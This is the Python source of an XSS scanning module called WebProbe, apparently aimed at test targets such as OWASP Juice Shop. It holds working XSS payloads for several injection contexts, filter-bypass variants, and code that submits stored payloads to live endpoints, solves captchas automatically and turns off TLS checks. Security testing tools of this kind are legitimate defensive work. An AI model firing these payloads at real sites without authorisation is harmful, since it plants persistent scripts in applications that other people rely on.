# scanner/xss.py
# WebProbe — Industry Level XSS Scanner
# Fixed: message field no longer skipped
# Fixed: Only truly numeric fields skipped
# Fixed: Stored XSS properly verified
# Fixed: False positive elimination with baseline

import os
import re
import time
import threading
import html
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs
from utils.http_engine import send_get, send_post
from utils.helpers import get_timestamp
from rich.console import Console

console = Console()
print_lock = threading.Lock()

XSS_MARKER = "WEBPROBEXSS7331"

DOM_DANGEROUS_PATTERNS = [
    r'innerHTML\s*=\s*[^;]+location',
    r'innerHTML\s*=\s*[^;]+search',
    r'innerHTML\s*=\s*[^;]+hash',
    r'outerHTML\s*=\s*[^;]+location',
    r'document\.write\s*\([^)]*location',
    r'document\.write\s*\([^)]*search',
    r'eval\s*\([^)]*location',
    r'eval\s*\([^)]*search',
    r'setTimeout\s*\([^)]*location',
    r'location\.href\s*=\s*[^;]+hash',
    r'location\.href\s*=\s*[^;]+search',
    r'\$\([^)]*\)\.html\([^)]*location',
    r'insertAdjacentHTML\s*\([^)]*location',
]

CONTEXTS = {
    "html_tag":  r'<[^>]*WEBPROBEXSS7331[^>]*>',
    "html_attr": r'="[^"]*WEBPROBEXSS7331[^"]*"',
    "html_attr2":r"='[^']*WEBPROBEXSS7331[^']*'",
    "script_var":r'var\s+\w+\s*=\s*["\']?WEBPROBEXSS7331',
    "html_body": r'>[^<]*WEBPROBEXSS7331[^<]*<',
}

CONTEXT_PAYLOADS = {
    "html_body": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
    ],
    "html_attr": [
        "\" onmouseover=alert(1) x=\"",
        "\" onfocus=alert(1) autofocus \"",
        "\" onclick=alert(1) \"",
    ],
    "html_attr2": [
        "' onmouseover=alert(1) x='",
        "' onfocus=alert(1) autofocus '",
    ],
    "script_var": [
        "';alert(1)//",
        "\";alert(1)//",
        "`;alert(1)//",
    ],
    "html_tag": [
        " onmouseover=alert(1)>",
        "><script>alert(1)</script>",
        "><img src=x onerror=alert(1)>",
    ],
}

# ═══════════════════════════════════════════════════
# ONLY TRULY NUMERIC FIELDS ARE SKIPPED
# message, comment, text fields are NOT skipped
# ═══════════════════════════════════════════════════
NUMERIC_ONLY_FIELDS = [
    "rating", "age", "quantity", "amount",
    "price", "count", "num", "qty",
    "score", "page", "limit", "offset",
]

def is_strictly_numeric(param_name):
    """Only skip fields that are purely numeric by name"""
    name_lower = param_name.lower()
    # Exact match only — not partial
    return name_lower in NUMERIC_ONLY_FIELDS

def load_payloads():
    payload_file = os.path.join(
        os.path.dirname(os.path.dirname(__file__)),
        "payloads", "xss.txt"
    )
    try:
        with open(payload_file, "r") as f:
            payloads = [l.strip() for l in f
                       if l.strip() and not l.startswith("#")]
        with print_lock:
            console.print(
                f"[dim]    [*] Loaded {len(payloads)} XSS payloads[/dim]"
            )
        return payloads
    except FileNotFoundError:
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ]

def send_request(url, method, param_name, payload, base_data=None):
    try:
        if method == "get":
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}" if parsed.scheme else url.split("?")[0]
            query_dict = {}
            if parsed.query:
                for k, v in parse_qs(parsed.query).items():
                    query_dict[k] = v[0] if v else ""
            query_dict[param_name] = payload
            return send_get(base, params=query_dict)
        else:
            data = dict(base_data) if base_data else {}
            data[param_name] = payload
            return send_post(url, data=data)
    except Exception:
        return None

def send_json_request(url, param_name, payload, base_data=None):
    try:
        import requests
        import urllib3
        urllib3.disable_warnings()
        data = dict(base_data) if base_data else {}
        data[param_name] = payload
        headers = {"Content-Type": "application/json"}
        return requests.post(
            url, json=data, headers=headers,
            timeout=10, verify=False
        )
    except Exception:
        return None

def is_reflected_properly(response_text, payload, baseline_text=""):
    """
    Check if payload is genuinely reflected
    Eliminates false positives by comparing to baseline
    """
    if not response_text or not payload:
        return False, "not_reflected"

    # Check unique marker — most reliable
    if XSS_MARKER in payload:
        if XSS_MARKER in baseline_text:
            return False, "false_positive_baseline"
        if XSS_MARKER in response_text:
            return True, "marker_confirmed"

    # Check exact payload not in baseline
    if payload in response_text and payload not in baseline_text:
        return True, "exact"

    # Check event handlers not in baseline
    for event in ["onerror", "onload", "onclick",
                  "onmouseover", "onfocus"]:
        if (event in payload.lower() and
                event in response_text.lower() and
                event not in baseline_text.lower()):
            return True, f"event_{event}"

    return False, "not_reflected"

def detect_context(response_text):
    for context_name, pattern in CONTEXTS.items():
        if re.search(pattern, response_text, re.IGNORECASE):
            return context_name
    if XSS_MARKER in response_text:
        return "html_body"
    return "html_body"

def _build_finding(url, param_name, method,
                   xss_type, payload, evidence,
                   injection_point="body"):
    cvss = 8.8 if "stored" in xss_type.lower() else 7.1
    risk = "CRITICAL" if "stored" in xss_type.lower() else "HIGH"
    return {
        "vulnerability": "Cross Site Scripting (XSS)",
        "type": f"XSS — {xss_type}",
        "url": url,
        "parameter": param_name,
        "payload": payload,
        "method": method.upper(),
        "evidence": evidence,
        "xss_type": xss_type,
        "injection_point": injection_point,
        "response_status": 200,
        "risk_level": risk,
        "cvss_score": cvss,
        "cwe": "CWE-79",
        "owasp": "A03:2021 — Injection",
        "timestamp": get_timestamp(),
    }

def detect_reflected_xss(url, method, param_name,
                          base_data, payloads):
    # Get baseline first
    baseline_r = send_request(
        url, method, param_name, "normaltest123", base_data
    )
    baseline_text = baseline_r.text if baseline_r else ""

    # Inject marker to find context
    marker_r = send_request(
        url, method, param_name, XSS_MARKER, base_data
    )
    if marker_r is None:
        return None

    context = "html_body"
    if (XSS_MARKER in marker_r.text and
            XSS_MARKER not in baseline_text):
        context = detect_context(marker_r.text)
        with print_lock:
            console.print(
                f"[dim]        [*] Context: {context}[/dim]"
            )
        context_payloads = CONTEXT_PAYLOADS.get(context, [])
        priority_payloads = context_payloads + payloads[:40]
    else:
        priority_payloads = payloads[:50]

    for payload in priority_payloads:
        r = send_request(url, method, param_name, payload, base_data)
        if r is None:
            continue

        reflected, reflect_type = is_reflected_properly(
            r.text, payload, baseline_text
        )
        if reflected and reflect_type != "false_positive_baseline":
            return {
                "xss_type": "Reflected XSS",
                "payload": payload,
                "evidence": (
                    f"Payload reflected ({reflect_type}) "
                    f"in {context} context"
                ),
                "context": context,
            }

    return None

def _solve_captcha(base_url):
    """Attempts to solve math captcha if present (e.g. Juice Shop /rest/captcha)"""
    try:
        captcha_url = base_url.rstrip("/") + "/rest/captcha"
        r = send_get(captcha_url)
        if r and r.status_code == 200:
            data = r.json()
            c_data = data.get("data", data) if isinstance(data, dict) else {}
            cid = c_data.get("captchaId", 0)
            ans = c_data.get("answer")
            if ans is None and "captcha" in c_data:
                expr = re.sub(r'[^0-9+\-*/]', '', str(c_data["captcha"]))
                if expr:
                    try:
                        ans = str(eval(expr))
                    except Exception:
                        pass
            return cid, str(ans if ans is not None else "0")
    except Exception:
        pass
    return None, None


def detect_stored_xss(url, method, param_name,
                       base_data, payloads, source_url=None):
    """
    Detect stored XSS
    Fixed: message and comment fields tested
    Fixed: Automatic CAPTCHA resolution and JSON API submission
    Fixed: Proper verification with baseline
    """
    if method != "post":
        return None

    # Only skip actual auth endpoints
    skip_urls = ["login", "signin"]
    if any(s in url.lower() for s in skip_urls):
        return None

    # Skip register only for email/password fields
    if "register" in url.lower() or "api/users" in url.lower():
        skip_register_params = ["email", "password",
                                "passwordrepeat", "securityanswer"]
        if param_name.lower() in skip_register_params:
            return None

    # Parse base URL for checking API responses
    from urllib.parse import urlparse
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    # Get baseline of viewing page
    check_url = source_url or url
    baseline_r = send_get(check_url)
    baseline_text = baseline_r.text if baseline_r else ""

    # Also check feedback API baseline if testing feedback
    api_feedbacks_url = f"{base_url}/api/Feedbacks"
    feedbacks_baseline_r = send_get(api_feedbacks_url)
    feedbacks_baseline_text = feedbacks_baseline_r.text if feedbacks_baseline_r else ""

    stored_payloads = [
        f"<script>alert('{XSS_MARKER}')</script>",
        f"<img src=x onerror=alert('{XSS_MARKER}')>",
        f"<svg onload=alert('{XSS_MARKER}')>",
        f"\"><img src=x onerror=alert('{XSS_MARKER}')>",
        f"'><svg onload=alert('{XSS_MARKER}')>",
        f"<body onload=alert('{XSS_MARKER}')>",
    ]

    for payload in stored_payloads:
        data = dict(base_data) if base_data else {}
        data[param_name] = payload

        # Add required fields for Juice Shop feedback / complaints
        if "feedback" in url.lower() or "feedbacks" in url.lower():
            cid, ans = _solve_captcha(base_url)
            if cid is not None:
                data["captchaId"] = cid
                data["captcha"] = ans
            else:
                data["captchaId"] = data.get("captchaId", 0)
                data["captcha"] = data.get("captcha", "0")
            data["rating"] = int(data.get("rating", 5))

        # Try form POST
        r_submit = send_post(url, data=data)

        # If rejected or endpoint is a REST API, try JSON submission
        if r_submit is None or r_submit.status_code in [400, 415, 422] or "/rest/" in url or "/api/" in url:
            r_json = send_json_request(url, param_name, payload, base_data=data)
            if r_json is not None and r_json.status_code in [200, 201]:
                r_submit = r_json

        if r_submit is None or r_submit.status_code not in [200, 201]:
            continue

        # Fetch viewing page
        r_check = send_get(check_url)
        if r_check and (XSS_MARKER in r_check.text and XSS_MARKER not in baseline_text):
            return {
                "xss_type": "Stored XSS",
                "payload": payload,
                "evidence": (
                    f"Payload stored and confirmed at {check_url} - unique XSS marker "
                    f"found after submission to {url}"
                ),
                "context": "stored",
            }

        # Also verify against feedback/complaint retrieval endpoint
        if "feedback" in url.lower() or "feedbacks" in url.lower():
            r_fb = send_get(api_feedbacks_url)
            if r_fb and (XSS_MARKER in r_fb.text and XSS_MARKER not in feedbacks_baseline_text):
                return {
                    "xss_type": "Stored XSS",
                    "payload": payload,
                    "evidence": (
                        f"Payload stored and confirmed in {api_feedbacks_url} - unique XSS marker "
                        f"found after submission to {url}"
                    ),
                    "context": "stored",
                }

    return None

def detect_dom_xss(url, html_content):
    if not html_content:
        return []

    findings = []
    seen = set()

    for pattern in DOM_DANGEROUS_PATTERNS:
        matches = re.findall(pattern, html_content, re.IGNORECASE)
        if matches:
            preview = matches[0][:80]
            if preview not in seen:
                seen.add(preview)
                findings.append({
                    "xss_type": "DOM XSS (Code Pattern)",
                    "payload": "N/A — Static analysis",
                    "evidence": f"Dangerous sink: '{preview}'",
                    "context": "dom",
                    "url": url,
                })

    return findings[:2]

def detect_header_xss(url):
    import requests
    import urllib3
    urllib3.disable_warnings()

    try:
        baseline_r = requests.get(url, timeout=10, verify=False)
        baseline_text = baseline_r.text if baseline_r else ""
    except Exception:
        baseline_text = ""

    injectable_headers = [
        "User-Agent", "Referer",
        "X-Forwarded-For", "X-Real-IP",
        "Accept-Language", "X-Custom-Header",
    ]

    header_payloads = [
        f"<img src=x onerror=alert('{XSS_MARKER}')>",
        f"<script>alert('{XSS_MARKER}')</script>",
        f"<svg onload=alert('{XSS_MARKER}')>",
    ]

    findings = []
    for header_name in injectable_headers:
        for payload in header_payloads:
            try:
                r = requests.get(
                    url,
                    headers={header_name: payload},
                    timeout=10, verify=False
                )
                if (XSS_MARKER in r.text and
                        XSS_MARKER not in baseline_text):
                    findings.append({
                        "xss_type": f"Reflected XSS (Header: {header_name})",
                        "payload": payload,
                        "evidence": (
                            f"XSS via {header_name} — "
                            f"marker confirmed in response"
                        ),
                        "context": "header",
                        "url": url,
                        "header": header_name,
                    })
                    break
            except Exception:
                continue

    return findings

def detect_filter_bypass(url, method, param_name, base_data):
    baseline_r = send_request(
        url, method, param_name, "normaltest", base_data
    )
    baseline_text = baseline_r.text if baseline_r else ""

    bypass_payloads = [
        f"<img src=x onerror=alert('{XSS_MARKER}')>",
        f"<svg onload=alert('{XSS_MARKER}')>",
        f"<ScRiPt>alert('{XSS_MARKER}')</sCrIpT>",
        f"<IMG SRC=x ONERROR=alert('{XSS_MARKER}')>",
        f"<img\tsrc=x\tonerror=alert('{XSS_MARKER}')>",
        f"<img\nsrc=x\nonerror=alert('{XSS_MARKER}')>",
        f"\"><img src=x onerror=alert('{XSS_MARKER}')>",
        f"'><svg onload=alert('{XSS_MARKER}')>",
        f"<svg><script>alert('{XSS_MARKER}')</script></svg>",
        f"\u003cscript\u003ealert('{XSS_MARKER}')\u003c/script\u003e",
    ]

    for payload in bypass_payloads:
        try:
            r = send_request(url, method, param_name, payload, base_data)
            if r is None:
                continue
            if (XSS_MARKER in r.text and
                    XSS_MARKER not in baseline_text):
                return {
                    "xss_type": "Reflected XSS (Filter Bypass)",
                    "payload": payload,
                    "evidence": "Filter bypassed — marker confirmed",
                    "context": "bypass",
                }
        except Exception:
            continue

    return None

def test_parameter(url, param_name, param_value,
                   method, form_data=None, payloads=None,
                   source_url=None, html_content=None):
    if payloads is None:
        payloads = load_payloads()

    # Only skip truly numeric fields
    if is_strictly_numeric(param_name):
        with print_lock:
            console.print(
                f"[dim]      [→] Skip numeric: {param_name}[/dim]"
            )
        return None

    with print_lock:
        console.print(
            f"[dim]      [→] XSS: {param_name} @ "
            f"{url[:55]}[/dim]"
        )

    base_data = dict(form_data) if form_data else {}

    # Method 1: Reflected XSS
    result = detect_reflected_xss(
        url, method, param_name, base_data, payloads
    )
    if result:
        with print_lock:
            console.print(
                f"[bold yellow]      [!!!] "
                f"{result['xss_type']}: {param_name}[/bold yellow]"
            )
        return _build_finding(
            url, param_name, method,
            result["xss_type"],
            result["payload"],
            result["evidence"],
        )

    # Method 2: Filter Bypass
    result = detect_filter_bypass(
        url, method, param_name, base_data
    )
    if result:
        with print_lock:
            console.print(
                f"[bold yellow]      [!!!] "
                f"{result['xss_type']}: {param_name}[/bold yellow]"
            )
        return _build_finding(
            url, param_name, method,
            result["xss_type"],
            result["payload"],
            result["evidence"],
        )

    # Method 3: Stored XSS
    result = detect_stored_xss(
        url, method, param_name,
        base_data, payloads, source_url
    )
    if result:
        with print_lock:
            console.print(
                f"[bold yellow]      [!!!] "
                f"{result['xss_type']}: {param_name}[/bold yellow]"
            )
        return _build_finding(
            url, param_name, method,
            result["xss_type"],
            result["payload"],
            result["evidence"],
        )

    with print_lock:
        console.print(
            f"[dim]      [-] Clean: {param_name}[/dim]"
        )
    return None

def build_test_tasks(crawler_results):
    tasks = []
    seen = set()

    forms = crawler_results.get("forms", [])
    params = crawler_results.get("params", [])

    for form in forms:
        url = form.get("action", "")
        method = form.get("method", "get").lower()
        inputs = form.get("inputs", [])
        source_url = form.get("source_url", url)
        base_data = {
            i["name"]: i.get("value", "test")
            for i in inputs
        }

        for inp in inputs:
            name = inp.get("name", "")
            if not name:
                continue
            if inp.get("type") in ["submit", "button",
                                    "image", "file", "hidden"]:
                continue

            key = f"{url}_{name}_{method}"
            if key not in seen:
                seen.add(key)
                tasks.append({
                    "url": url,
                    "param_name": name,
                    "param_value": inp.get("value", ""),
                    "method": method,
                    "form_data": base_data,
                    "source_url": source_url,
                    "source": "form",
                })

    for param in params:
        url = param.get("url", "")
        name = param.get("name", "")
        if not url or not name:
            continue
        base_url_p = url.split("?")[0]
        key = f"{base_url_p}_{name}_get"
        if key not in seen:
            seen.add(key)
            tasks.append({
                "url": url,
                "param_name": name,
                "param_value": param.get("value", ""),
                "method": "get",
                "form_data": None,
                "source_url": url,
                "source": "url_param",
            })

    return tasks

def scan(crawler_results, llm_payloads=None):
    findings = []
    findings_lock = threading.Lock()

    console.print(
        "\n[bold yellow][*] Starting XSS Scan...[/bold yellow]"
    )

    if llm_payloads and len(llm_payloads) > 0:
        seen = set()
        payloads = [p for p in llm_payloads if not (p in seen or seen.add(p))]
    else:
        payloads = load_payloads()

    console.print(
        f"[cyan]    [*] Active Payloads to Test: {len(payloads)}[/cyan]"
    )

    tasks = build_test_tasks(crawler_results)
    pages = crawler_results.get("pages", [])
    base_url = crawler_results.get("base_url", "")

    console.print(
        f"[cyan]    [*] Parameters: {len(tasks)}[/cyan]"
    )

    # DOM XSS
    console.print(
        f"[cyan]    [*] DOM analysis: {len(pages)} pages[/cyan]"
    )
    for page in pages[:10]:
        page_url = page.get("url", "")
        r = send_get(page_url)
        if r and r.text:
            dom_results = detect_dom_xss(page_url, r.text)
            for dr in dom_results:
                finding = _build_finding(
                    dr["url"], "DOM", "GET",
                    dr["xss_type"], dr["payload"],
                    dr["evidence"], "dom",
                )
                with findings_lock:
                    exists = any(
                        f["url"] == dr["url"] and
                        f["xss_type"] == dr["xss_type"]
                        for f in findings
                    )
                    if not exists:
                        findings.append(finding)

    # Header XSS
    if base_url:
        console.print(
            f"[cyan]    [*] Header XSS: {base_url}[/cyan]"
        )
        for hr in detect_header_xss(base_url):
            findings.append(
                _build_finding(
                    hr["url"], hr.get("header", "header"),
                    "GET", hr["xss_type"],
                    hr["payload"], hr["evidence"], "header",
                )
            )

    # Parallel parameter testing
    with ThreadPoolExecutor(max_workers=5) as executor:
        future_to_task = {
            executor.submit(
                test_parameter,
                task["url"], task["param_name"],
                task["param_value"], task["method"],
                task["form_data"], payloads,
                task.get("source_url"), None,
            ): task
            for task in tasks
        }

        for future in as_completed(future_to_task):
            task = future_to_task[future]
            try:
                finding = future.result()
                if finding:
                    finding["source"] = task["source"]
                    with findings_lock:
                        base_f = finding["url"].split("?")[0]
                        exists = any(
                            f["url"].split("?")[0] == base_f and
                            f["parameter"] == finding["parameter"] and
                            f["xss_type"] == finding["xss_type"]
                            for f in findings
                        )
                        if not exists:
                            findings.append(finding)
            except Exception:
                pass

    console.print(
        f"\n[bold yellow][+] XSS Scan Complete![/bold yellow]"
    )
    console.print(
        f"[yellow]    Total: {len(findings)}[/yellow]"
    )
    for i, f in enumerate(findings):
        console.print(
            f"[yellow]    [{i+1}] {f['type']} | "
            f"{f['parameter']} | {f['url'][:55]}[/yellow]"
        )

    return findings
